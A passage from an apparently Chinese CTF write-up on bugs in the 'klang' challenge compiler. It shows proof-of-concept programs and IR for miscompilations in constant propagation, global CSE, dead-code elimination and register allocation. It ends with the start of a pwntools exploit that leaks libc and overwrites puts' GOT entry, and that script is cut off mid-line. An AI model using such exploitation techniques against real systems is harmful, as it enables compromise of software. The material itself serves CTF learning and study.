class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span>                      <br>abaaba<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure><h2 id="Optimize"><a href="#Optimize" class="headerlink" title="Optimize"></a>Optimize</h2><p>WorkList算法</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/worklist.png" class title="worklist"><h3 id="ConstantPropagate"><a href="#ConstantPropagate" class="headerlink" title="ConstantPropagate"></a>ConstantPropagate</h3><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/const.png" class title="const"><h4 id="BUG-2"><a href="#BUG-2" class="headerlink" title="BUG"></a>BUG</h4><p>ReplaceIn的时候使用的是Out（应该用In）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;State = Out[BB];<span class="hljs-comment">// 使用Out</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; InstIt-&gt;Ins(); i++) &#123;<br>    <span class="hljs-keyword">if</span>(InstIt-&gt;GetIn(i).IsRegister()) &#123;<br>      <span class="hljs-type">size_t</span> Reg = InstIt-&gt;GetIn(i).RegId();<br>      <span class="hljs-keyword">if</span>(State.IsConstant(Reg)) &#123;<br>        <span class="hljs-type">int64_t</span> Value = State.GetConstant(Reg);<br>        InstIt-&gt;ReplaceIn(i, Operand::CreateImmediate(Value)); <span class="hljs-comment">// ReplaceIn</span><br>        Changed = <span class="hljs-literal">true</span>; <br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样如果在block结尾给变量赋值一个常量block中所有过程值都会被覆盖</p><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b -&gt; <span class="hljs-type">int</span> <br>&#123;<br>prints(<span class="hljs-string">&quot;Please Input a:&quot;</span>);<br>a := inputi();<br>b := <span class="hljs-number">1</span> + a;<br>a := <span class="hljs-number">100</span>;<br>prints(<span class="hljs-string">&quot;b = a + 1 =&quot;</span>);<br>printi(b);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化前后的IR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE :<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">4</span><br>        %<span class="hljs-number">5</span> = #<span class="hljs-number">1</span> + %<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">64</span><br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi %<span class="hljs-number">1</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER :<br>define main<br>bb1:<br>        %<span class="hljs-number">3</span> = load_label __str0<br>        call prints %<span class="hljs-number">3</span><br>        %<span class="hljs-number">4</span> = call inputi<br>        %<span class="hljs-number">7</span> = load_label __str1<br>        call prints %<span class="hljs-number">7</span><br>        call printi #<span class="hljs-number">65</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./const</span>            <br>INPUT a:<br>12 <br>OUTPUT b = a + 1:<br>101<br></code></pre></td></tr></table></figure><h3 id="CopyPropagate"><a href="#CopyPropagate" class="headerlink" title="CopyPropagate"></a>CopyPropagate</h3><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/copy.png" class title="copy"><h3 id="CSE"><a href="#CSE" class="headerlink" title="CSE"></a>CSE</h3><p>分LocalCSE和GlobalCSE</p><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/CSE.png" class title="CSE"><h4 id="LocalCSE"><a href="#LocalCSE" class="headerlink" title="LocalCSE"></a>LocalCSE</h4><p>以BasicBlock为单位处理，处理函数LocalCSEBlock：</p><ul><li><p>第一个循环填充以下局部变量：</p><ul><li>Mapping：map CSEValue -&gt; Ins ID</li><li>Defs：map CSEValue -&gt; Ins</li><li>State：map Ins ID -&gt; set of 现有的CSEValue对应Ins ID</li><li>Reusable：map CSEValue -&gt; vector of CSEValue出现的所有Ins</li></ul></li><li><p>第二个循环遍历所有具有重复CSEValue的Ins，做以下变换：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/replace.png" class title="replace"></li><li><p>没有处理右值改变的情况，也不用处理，FromInstruction允许右值为Reg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// RHS should be immutable</span><br><span class="hljs-keyword">if</span>((Op1.IsImmediate() || Op1.IsParameter()) &amp;&amp; (Op2.IsImmediate() || Op2.IsParameter())) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::make_optional(CSEValue(BinInst.GetOperation(), Op1, Op2));<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="GlobalCSE"><a href="#GlobalCSE" class="headerlink" title="GlobalCSE"></a>GlobalCSE</h4><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/GCSE.png" class title="GCSE"><p>Available Expressions算法：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/ae.png" class title="ae"><p>指令替换：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/cseee.png" class title="cseee"><p>实际实现：</p><ul><li><p>获取Available Expressions</p></li><li><p>遍历每一个BasicBlock BB</p></li><li><p>遍历BB中的每一条Instruction Ins</p></li><li><p>Ins中存在Available Expressions则：</p><ul><li><p>递归遍历BB所有前驱，替换每一个Available Expressions</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = b + <span class="hljs-number">1</span> -&gt; a<span class="hljs-string">&#x27; = b + 1</span><br><span class="hljs-string">a = a&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>替换Ins</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> b + <span class="hljs-number">1</span> -&gt; <span class="hljs-keyword">c</span> <span class="hljs-operator">=</span> a&#x27;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h5 id="BUG-3"><a href="#BUG-3" class="headerlink" title="BUG"></a>BUG</h5><ul><li><p>Meet调用的Intersect中如果GCSEState没有初始化则将Other复制过去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(!Init_) &#123;<br>  Values_ = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>(Other.Values_.begin(), Other.Values_.end());<br>  Init_ = <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>根据算法除了Entry初始化为空其他的BB初始化为全集所以这样也没什么问题（</li><li>但实现没有Entry，就有问题了</li><li>在函数开头把表达式放进do-while里<ul><li>BB的前驱就有了他自己</li><li>没有Entry的空集把BB自己的表达式取交消掉</li><li>这样BB中的表达式会被错误优化掉</li></ul></li></ul><p>POC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : -&gt; <span class="hljs-type">int</span> <br>&#123;<br>test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>d := <span class="hljs-number">1</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>c := a + b;<br>prints(<span class="hljs-string">&quot;OUTPUT c = 114514 + 233333:&quot;</span>);<br>printi(c);<br>d := d - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(d &gt; <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化前后的IR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + $<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">1</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">8</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">6</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse1</span>            <br>OUTPUT c = 114514 + 233333:<br>0<br></code></pre></td></tr></table></figure><p>会有这个输出还有下面👇的问题的原因</p></li><li><p>GlobalCSEBlock替换的时候会先递归替换BB所有前驱中的expr再换BB</p><ul><li>但替换后没有State中删除expr</li><li>如果BB没有前驱会造成未初始化访问</li></ul><p>POC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span>:-&gt;<span class="hljs-type">int</span><br>&#123;<br>test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化前后的IR</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">4</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">4</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">5</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        jmp bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        call printi %<span class="hljs-number">6</span><br>        %<span class="hljs-number">6</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">6</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        jmp bb2<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse</span>            <br>140063322342087<br></code></pre></td></tr></table></figure></li></ul><h3 id="DeadCodeElimination"><a href="#DeadCodeElimination" class="headerlink" title="DeadCodeElimination"></a>DeadCodeElimination</h3><h4 id="DeadVariableElimination"><a href="#DeadVariableElimination" class="headerlink" title="DeadVariableElimination"></a>DeadVariableElimination</h4><p>数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LivenessState</span> &#123;</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-type">size_t</span>&gt; LiveRegs_;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="BUG-4"><a href="#BUG-4" class="headerlink" title="BUG"></a>BUG</h5><p>在Call、CallVoid和ArrayStore相关变量判断的时候取的是Reg的最后一次定义，有可能在该指令之后，这样会导致之前的定义被优化掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">auto</span> &amp;Inst = *InstIt;<br>  <span class="hljs-keyword">if</span>(Inst.Type() == Instruction::Call <br>  || Inst.Type() == Instruction::CallVoid <br>  || Inst.Type() == Instruction::ArrayStore) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; Inst.Ins(); i++) &#123;<br>      <span class="hljs-keyword">auto</span> Op = Inst.GetIn(i);<br>      <span class="hljs-keyword">if</span>(Op.IsRegister()) &#123;<br>        AddAllToNeeded(LastDefs[Op.RegId()]);<span class="hljs-comment">// 取到的LastDef可能在Call之后</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c -&gt; <span class="hljs-type">int</span> <br>&#123;<br><span class="hljs-type">double</span>(c);<br>c := b + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">double</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化前后的IR：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = #<span class="hljs-number">0</span><br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br>            <br>FINAL<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> #<span class="hljs-number">1</span><span class="hljs-comment">// %2 = #1是常量传播的锅</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="CodeGen"><a href="#CodeGen" class="headerlink" title="CodeGen"></a>CodeGen</h2><ul><li><p>Codegen</p><ul><li><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/mf.png" class title="mf"></li><li><p>功能：IR转指令，替换虚拟寄存器</p></li></ul></li><li><p>InstSched</p><ul><li><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/node.png" class title="node"></li><li><p>功能：指令调度，顺序优化</p></li></ul></li><li><p>RegAlloc：</p><ul><li><p>数据结构：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/live.png" class title="live"></li><li><p>功能：寄存器分配</p></li></ul></li></ul><h3 id="RegAlloc"><a href="#RegAlloc" class="headerlink" title="RegAlloc"></a>RegAlloc</h3><p>Linear Scan算法：</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/scan.png" class title="scan"><h4 id="BUG-5"><a href="#BUG-5" class="headerlink" title="BUG"></a>BUG</h4><p>发生Spill的时候只从当前Interval的Start开始，也就是只从发生Spill的时间点开始标记</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(Active.size() == kAllocatableRegisters) &#123;<br>  <span class="hljs-keyword">auto</span> [Spilled, _] = SpillAtInterval(I);<br>  <span class="hljs-keyword">auto</span> Slot = AllocateSpillSlot(Spilled);<br>  Spilled-&gt;SpillAt(I-&gt;Start(), Slot);<br>&#125; <br></code></pre></td></tr></table></figure><p>如果有BackEdge的话会有问题，会使用Spill前的寄存器而不是Stack空间</p><p>POC：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := array_new(<span class="hljs-number">1</span>);<br>b := array_new(<span class="hljs-number">2</span>);<br>c := array_new(<span class="hljs-number">3</span>);<br>d := array_new(<span class="hljs-number">4</span>);<br>e := array_new(<span class="hljs-number">5</span>);<br>f := array_new(<span class="hljs-number">7</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br>f[<span class="hljs-number">0</span>] := <span class="hljs-number">10</span>;<br>g := inputi();<br>a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>f[<span class="hljs-number">0</span>] := <span class="hljs-number">6</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>dup(g);<br>dup(f[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure><p>输入输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span><br>114514<br>1<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure><h1 id="终于能开始pwn了-ˉ▽ˉ；-…"><a href="#终于能开始pwn了-ˉ▽ˉ；-…" class="headerlink" title="终于能开始pwn了(ˉ▽ˉ；)…"></a>终于能开始pwn了(ˉ▽ˉ；)…</h1><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><p>GlobalCSE未初始化泄漏libc + RegAlloc任意写改puts的got表</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span 